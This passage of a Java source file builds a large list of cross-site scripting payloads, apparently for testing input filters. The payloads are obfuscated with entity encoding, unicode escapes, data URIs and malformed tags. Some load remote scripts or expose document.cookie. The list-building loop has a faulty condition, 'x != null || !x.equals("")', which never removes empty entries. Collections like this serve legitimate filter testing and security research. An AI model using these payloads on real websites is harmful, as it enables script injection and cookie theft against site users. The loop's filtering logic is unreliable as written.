                + "<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>\n"
                + "<form><iframe &#09;&#10;&#11; src=\"javascript&#58;alert(1)\"&#11;&#10;&#09;;>\n"
                + "<a href=\"data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&#09;&#10;&#11;>X</a\n"
                + "http://www.google<script .com>alert(document.location)</script\n"
                + "<a&#32;href&#61;&#91;&#00;&#93;\"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;\">XYZ</a\n"
                + "<img/src=@&#32;&#13; onerror = prompt('&#49;')\n"
                + "<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;\n"
                + "<script ^__^>alert(String.fromCharCode(49))</script ^__^\n"
                + "</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(\n"
                + "&#00;</form><input type&#61;\"date\" onfocus=\"alert(1)\">\n"
                + "<form><textarea &#13; onkeyup='\\u0061\\u006C\\u0065\\u0072\\u0074&#x28;1&#x29;'>\n"
                + "<script /***/>/***/confirm('\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450')/***/</script /***/\n"
                + "<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>\n"
                + "<a href=\"javascript:void(0)\" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>\n"
                + "<script ~~~>alert(0%0)</script ~~~>\n"
                + "<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>\n"
                + "<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN\n"
                + "<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)\n"
                + "&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'\n"
                + "&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}\n"
                + "<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^\n"
                + "<div/style=\"width:expression(confirm(1))\">X</div> {IE7}\n"
                + "<iframe/%00/ src=javaSCRIPT&colon;alert(1)\n"
                + "//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//\n"
                + "/*iframe/src*/<iframe/src=\"<iframe/src=@\"/onload=prompt(1) /*iframe/src*/>\n"
                + "//|\\\\ <script //|\\\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\\\ </script //|\\\\\n"
                + "</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>\n"
                + "<a/href=\"javascript:&#13; javascript:prompt(1)\"><input type=\"X\">\n"
                + "</plaintext\\></|\\><plaintext/onmouseover=prompt(1)\n"
                + "</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}\n"
                + "<a href=\"javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;\"><button>\n"
                + "<div onmouseover='alert&lpar;1&rpar;'>DIV</div>\n"
                + "<iframe style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\">\n"
                + "<a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X</a>\n"
                + "<embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\">\n"
                + "<object data=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\">\n"
                + "<var onmouseover=\"prompt(1)\">On Mouse Over</var>\n"
                + "<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>\n"
                + "<img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">\n"
                + "<%<!--'%><script>alert(1);</script -->\n"
                + "<script src=\"data:text/javascript,alert(1)\"></script>\n"
                + "<iframe/src \\/\\/onload = prompt(1)\n"
                + "<iframe/onreadystatechange=alert(1)\n"
                + "<svg/onload=alert(1)\n"
                + "<input value=<><iframe/src=javascript:confirm(1)\n"
                + "<input type=\"text\" value=`` <div/onmouseover='alert(1)'>X</div>\n"
                + "http://www.<script>alert(1)</script .com\n"
                + "<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>\n"
                + "<svg><script ?>alert(1)\n"
                + "<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>\n"
                + "<img src=`xx:xx`onerror=alert(1)>\n"
                + "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>\n"
                + "<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/>\n"
                + "<math><a xlink:href=\"//jsfiddle.net/t846h/\">click\n"
                + "<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>\n"
                + "<svg contentScriptType=text/vbs><script>MsgBox+1\n"
                + "<a href=\"data:text/html;base64_,<svg/onload=\\u0061&#x6C;&#101%72t(1)>\">X</a\n"
                + "<iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074('\\u0061') worksinIE>\n"
                + "<script>~'\\u0061' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+\n"
                + "<script/src=\"data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert('\\u0061')\"></script a=\\u0061 & /=%2F\n"
                + "<script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/XSS/)></script\n"
                + "<object data=javascript&colon;\\u0061&#x6C;&#101%72t(1)>\n"
                + "<script>+-+-1-+-+alert(1)</script>\n"
                + "<body/onload=&lt;!--&gt;&#10alert(1)>\n"
                + "<script itworksinallbrowsers>/*<script* */alert(1)</script\n"
                + "<img src ?itworksonchrome?\\/onerror = alert(1)\n"
                + "<svg><script>//&NewLine;confirm(1);</script </svg>\n"
                + "<svg><script onlypossibleinopera:-)> alert(1)\n"
                + "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe\n"
                + "<script x> alert(1) </script 1=2\n"
                + "<div/onmouseover='alert(1)'> style=\"x:\">\n"
                + "<--`<img/src=` onerror=alert(1)> --!>\n"
                + "<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>\n"
                + "<div style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\" onclick=\"alert(1)\">x</button>\n"
                + "\"><img src=x onerror=window.open('https://www.google.com/');>\n"
                + "<form><button formaction=javascript&colon;alert(1)>CLICKME\n"
                + "<math><a xlink:href=\"//jsfiddle.net/t846h/\">click\n"
                + "<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>\n"
                + "<iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>\n"
                + "<a href=\"data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203\">Click Me</a>\n"
                + "‘; alert(1);";

        for (String x : payload.split("\n")) {
            if (x != null || !x.equals("")) {
                list.add(x);
            }
        }
        return list;
    }

}
